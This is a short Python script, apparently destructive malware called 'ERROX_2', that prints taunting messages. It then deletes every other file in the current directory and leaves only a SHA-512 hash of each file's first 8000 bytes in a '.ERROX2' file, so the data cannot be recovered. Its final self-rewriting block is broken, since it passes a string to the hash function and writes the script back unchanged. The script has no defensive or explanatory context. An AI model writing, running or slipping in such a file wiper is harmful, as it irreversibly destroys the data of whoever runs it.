import os
import hashlib
import time

print("ERROX_2")
time.sleep(1)
print("Covering your tracks huh?")
time.sleep(1)
print("Welp, im not to judge.")
wd = os.getcwd()
allFiles = os.listdir(wd)
files = []
for item in allFiles:
    print(item)
    if item == os.path.basename(__file__):
        continue
    elif os.path.isfile(os.path.join(wd, item)):
        files.append(os.path.join(wd, item))
for item in files:
    content = ""
    with open(item, "rb") as file:
        content = file.read(8000)
    sha512 = hashlib.sha512()
    sha512.update(content)
    with open(f"{item}.ERROX2", "w") as file:
        file.write(sha512.hexdigest())
    os.remove(item)
content = ""
with open(os.path.basename(__file__), "r") as file:
    content = file.read()
with open(os.path.basename(__file__), "w") as file:
    sha512 = hashlib.sha512()
    sha512.update(content)
    file.write(content)
